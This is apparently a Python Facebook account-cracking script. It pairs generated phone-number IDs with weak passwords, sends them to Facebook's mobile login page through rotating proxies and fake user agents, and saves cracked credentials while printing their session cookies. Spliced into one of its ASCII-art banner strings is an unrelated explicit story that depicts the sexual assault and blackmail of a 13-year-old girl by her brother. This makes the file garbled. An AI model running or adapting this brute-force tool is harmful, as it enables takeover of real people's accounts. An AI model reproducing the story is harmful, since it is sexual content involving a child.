import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
li="\033[38;5;46m—"

cox=str(f"{li}"*37)        
logo = ("""\033[33;1m
⠀.  ⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⠿⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣶⣶⣤⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⢿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠈⠻⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣀⣤⣶⣶⣌⠻⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⠁⣰⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⠄⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⣛⣋⣼⣿⣿⣶⣿⣿⣿⣿⣿⣿⣯⡉⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢻⣿⣿⣿⣿⣿⡇⠀⠀⠈⠉⠉⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣴⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠹⢿⣿⣿⢿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣶⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣧⣄⣀⣀⣀⣀⣀⣀⡀
⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁

 
\033[1;92m   d88b  .d88b.  d8b   db d888888b      .d8888. d888888b d8b   db  d888b  
\033[1;92m   `8P' .8P  Y8. 888o  88   `88'        88'  YP   `88'   888o  88 88' Y8b 
\033[1;31m    88  88    88 88V8o 88    88         `8bo.      88    88V8o 88 88      
\033[1;31m    88  88    88 88 V8o88    88           `Y8b.    88    88 V8o88 88  ooo 
\033[1;92mdb. 88  `8b  d8' 88  V888   .88.        db   8D   .88.   88  V888 88. ~8~ 
\033[1;92mY8888P   `Y88P'  VP   V8P Y888888P      `8888Y' Y888888P VP   V8P  Y888P                🦱🧞⚖⁉⚽🌲ᶠYͧoͨᵏu                                                                                                                                
__________________________________________________

 \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:JONI_SING\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :            MR:JONI_SING
\033[1;92m Facebook:            Mr:JONI_SING
\033[1;92m Github  :            Mr-JONI_SING
\033[1;92m Version :            9.9.9
──────────────────────────────────────────────────""")
logo1 = ("""
────────────▄▀░░░░░▒▒▒█─
───────────█░░░░░░▒▒▒█▒█
──────────█░░░░░░▒▒▒█▒░█
────────▄▀░░░░░░▒▒▒▄▓░░█
───────█░░░░░░▒▒▒▒▄▓▒░▒▓
──────█▄▀▀▀▄▄▒▒▒▒▓▀▒░░▒▓
────▄▀░░░░░░▒▀▄▒▓▀▒░░░▒▓
───█░░░░░░░░░▒▒▓▀▒░░░░▒▓
───█░░░█░░░░▒▒▓█▒▒░░░▒▒▓
────█░░▀█░░▒▒▒█▒█░░░░▒▓▀
─────▀▄▄▀▀▀▄▄▀░█░░░░▒▒▓─
───────────█▒░░█░░░▒▒▓▀─
────────────█▒░░█▒▒▒▒▓──
─────────────▀▄▄▄▀▄▄▀─

first person smut story

im 13. i have an older brother who is 17. ryan. all my friends have crushes on him.
i mean, i cant blame them. he works out the gym and has abs and biceps n shit, and he looks like
the ideal guy youd repost on tiktok. hes got good fashion sense, and i cant lie he looks good in a compression shirt.
one day, my life changed with him completely.

its like june at this point so its pretty warm and ryan had his friend over, alex.
alex is the one i like the most. hes similar to ryan but a bit less buff and blonde.
im sat in my bedroom in my jean shorts and a short top i bought out of brandy melville. 
as im sat on my bed having a scroll on tiktok, the door bursts open
“RYAN. FUCK OFF AND SHUT THE DOOR.” i shout. my eyes are still on my phone.
i noticed the awkward silence: something was off. usually ryan had started arguing or he would start attacking me.
but no. this is silence, pure silence.
“..ryan? whats going o-“
i get cut off as a small plastic bag gets wrapped around my head.
i have low iron and get dizzy really easily, so thanks to the lack of oxygen i passed out.

“dude, are you sure this is okay?” 
“yes. weve literally been planning this for months.”
i heard. my eyes slowly open to see ryan and alex in my basement. shirtless.
“well well well, look whos awake” says ryan
i was tied to a chair with some ropes, wrists and ankles.
“what the fuck is this ryan? the both of you- is this some kind of a joke? because im not laughing.”
“shut up.” ryan said with a smirk on his face. 
“what do you want. money? food? prank calls? what is this for?” i asked.
“we dont want any of that from you.” alex says.
“okay then what is this..” i asked again.
“we want pussy. bad.” alex said.
my jaw dropped. i never thought id hear something like that come from him- especially to me.
“okay uhm.. i know some girls in the upper grade? i dont know what you want me to do”
“no dumbass. we want yours.” he replied.
my eyes widened. no way. im years younger than them.
“now you better do it.” ryan said angrily.
as if i was ever going to do that. im a child and hes my broth-
“or else we’ll show everyone this.” 
he pulled out his phone and showed me a video of me- 
a video of me masterbating.
“WHAT THE FUCK- WHERE DID YOU EVEN GET THAT”
alex walked towards the chair.
“you dont need to know. now, ryans room is the only room in the house with a lock. its also
soundproof for band practice. you cant leave and nobody can help you. we’re going to untie you and youre
gonna stand up and take off all your clothes. understand?” alex says.
i hesitated- but then i realised my life would be ruined if anyone saw that video. i nodded my head.
alex looked at me and smiled. “good girl.”
ryan strolled behind the chair and untied the ropes on my wrists and ankles. i slowly stood up as he was still behind me and
took off my brandy melville top and my jean shorts to reveal my white bra and black panties. alex was standing in front of
me watching, his blue eyes staring deeply into mine. i was so embarrassed. 
the tension between us got interrupted as i felt my panties get pulled down.
“hey what the fu-“
ryan covered my mouth with his hand and quickly put his thick 12 inch cock in me.
“fuck yeah.” he mumbled.
his cock was going in and out of me at a fast pace.
i was moaning uncontrollably- i was CRYING uncontrollably. my brother was fucking me.

please, uprate this if you want a part two!
- sweetheart 🩵
\033[1;92m
────────────▄▀░░░░░▒▒▒█─
───────────█░░░░░░▒▒▒█▒█
──────────█░░░░░░▒▒▒█▒░█
────────▄▀░░░░░░▒▒▒▄▓░░█
───────█░░░░░░▒▒▒▒▄▓▒░▒▓
──────█▄▀▀▀▄▄▒▒▒▒▓▀▒░░▒▓
────▄▀░░░░░░▒▀▄▒▓▀▒░░░▒▓
───█░░░░░░░░░▒▒▓▀▒░░░░▒▓
───█░░░█░░░░▒▒▓█▒▒░░░▒▒▓
────█░░▀█░░▒▒▒█▒█░░░░▒▓▀
─────▀▄▄▀▀▀▄▄▀░█░░░░▒▒▓─
───────────█▒░░█░░░▒▒▓▀─
────────────█▒░░█▒▒▒▒▓──
─────────────▀▄▄▄▀▄▄▀─
🦱🧞⚖⁉⚽🌲ᶠYͧoͨᵏu

\033[1;92m   d88b  .d88b.  d8b   db d888888b      .d8888. d888888b d8b   db  d888b  
\033[1;92m   `8P' .8P  Y8. 888o  88   `88'        88'  YP   `88'   888o  88 88' Y8b 
\033[1;31m    88  88    88 88V8o 88    88         `8bo.      88    88V8o 88 88      
\033[1;31m    88  88    88 88 V8o88    88           `Y8b.    88    88 V8o88 88  ooo 
\033[1;92mdb. 88  `8b  d8' 88  V888   .88.        db   8D   .88.   88  V888 88. ~8~ 
\033[1;92mY8888P   `Y88P'  VP   V8P Y888888P      `8888Y' Y888888P VP   V8P  Y888P     🦱🧞⚖⁉⚽🌲ᶠYͧoͨᵏu
__________________________________________________

 \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:JONI_SING\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :            MR:JONI_SING
\033[1;92m Facebook:            Mr:JONI_SING
\033[1;92m Github  :            Mr-JONI_SING
\033[1;92m Version :            9.9.9
──────────────────────────────────────────────────""")

def JONI_SINGx():
	print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')

def Main():
        os.system("clear")
        print(logo)
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')
        print(" \033[38;5;46m〱JONI_SING𝟬𝟭} 𝙍𝘼𝙉𝘿𝙊𝙈 𝘽𝘿")
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')      
        JONI_SING =input("\n〱\033[38;5;46mᴱᴺᵀᴱᴿ ᵞᴼᵁᴿ ᴾᴬˢˢᵂᴼᴿᴰ: ")
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')
        if JONI_SING in ["JONI_SING"]:
            fuck()
        if JONI_SING in ["JONI_SING", "00"]:
            exit()
        else:
            exit()
#===========𝙁𝙐𝘾𝙆 𝙔𝙊𝙐          
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')
    print('〱\033[38;5;46mJONI_SING]𝗦𝗜𝗠𝗘 𝗖𝗢𝗗𝗘〱\x1b[38;5;196m𝟬𝟭𝟳〱\033[34;1m𝟬𝟭𝟴〱\033[33;1m𝟬𝟭𝟵〱\x1b[38;5;196m𝟬𝟭𝟲')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')
    code = input('〱\033[38;5;46m{JONI_SING}〱𝗖𝗛𝗢𝗜𝗖𝗘 : ')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')
    print('〱\033[38;5;46mJONI_SING]𝙇𝙈𝙏〱\033[34;1m𝟮𝟬𝟬𝟬〱\033[34;1m𝟯𝟬𝟬𝟬〱\033[33;1m𝟱𝟬𝟬𝟬〱\x1b[38;5;196m𝟭𝟬𝟬𝟬𝟬')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')
    limit = int(input('〱\033[38;5;46mJONI_SING]〱𝗖𝗛𝗢𝗜𝗖𝗘 : '))
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')
        print('╔══➻🔰〱\033[38;5;46mJONI_SING\x1b[38;5;196m〱𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞\033[34;1m𝗜𝗗〱'+tl)
        print("╚══➻🔰〱\033[38;5;46mJONI_SING\033[37;1m〱𝗦𝗜𝗠𝗘\x1b[38;5;196m𝗖𝗢𝗗𝗘〱"+code)
        print('╔══➻🔰〱\033[38;5;46m𝗖𝗬𝗕𝗘𝗥\033[38;5;46m〱𝗪𝗢𝗥𝗞\x1b[38;5;196m〱𝗪𝗜𝗙𝗜\033[34;1m𝗗𝗔𝗧𝗔')
        print('╚══➻🔰〱\033[38;5;46m𝟵𝟵\x1b[38;5;196m〱𝗣𝗔𝗜𝗗\033[34;1m𝗖𝗢𝗠𝗠𝗔𝗡𝗗')
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(JONI_SING2,uid,pwx,tl)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')
    print('〱\033[38;5;46mJONI_SING] Crack process has been completed')
    print('〱\033[38;5;46m𝗖𝗬𝗕𝗘𝗥 𝟵𝟵] OK Ids saved in JONI_SING/OK.txt')
    print('〱\033[38;5;46mJONI_SING] CP Ids s═════aved in JONI_SING/CP.txt')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════JONI_SING')
def JONI_SING2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()           
            sys.stdout.write('\r\033[38;5;46m〱JONI_SING〱%s/%s〱𝗖𝗣-𝗶𝗗➲%s➲😓〱𝗢𝗞-𝗜𝗗➲🔰%s\r'%(loop,tl,len(cps),len(oks))),            
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
#_________𝗨𝗣𝗗𝗔𝗧𝗘 𝗦𝗬𝗦𝗧𝗘𝗠➻➲🥰🥰        
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5762.222", "Google Chrome";v="114.0.5762.222"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5762.222 Mobile Safari/537.36',
            'viewport-width': '980',
}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text           
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
#_________𝗢𝗞_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗢𝗞✅-𝗜𝗗-------➲🤯🤩       
                print(f"""
\033[33;1mJONI_SING-𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆╔══➻🔰\033[38;5;46m𝙉𝙐𝙈𝘽𝙀𝙍╔══➻🔰\033[38;5;46m{uid} 
\033[33;1mJONI_SING-𝙁𝗔𝘾𝙀𝘽𝙊𝙊𝙆╚══➻🔰\033[38;5;46m𝙋𝘼𝙎𝙎𝙒𝘿╚══➻🔰\033[38;5;46m{ps}
\033[33;1mJONI_SING-𝘾𝙊𝙊𝙆𝙀𝙎(𝗢𝗞✅)\033[38;5;46m{coki}
""")
                open('/sdcard/JONI_SING/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
 #_________𝗖𝗣_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗟𝗢𝗖𝗞-𝗜𝗗------➲ 😓😭
                print(f"""
\033[33;1mJONI_SING-𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆╔══➻🔰\033[38;5;46m𝙉𝙐𝙈𝘽𝙀𝙍╔══➻🔰\033[38;5;46m{uid} 
\033[33;1mJONI_SING-𝙁𝗔𝘾𝙀𝘽𝙊𝙊𝙆╚══➻🔰\033[38;5;46m𝙋𝘼𝙎𝙎𝙒𝘿╚══➻🔰\033[38;5;46m{ps}
""")
                open('/sdcard/JONI_SING -𝗖𝗣✅-𝗜𝗗✅-𝗜𝗗.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()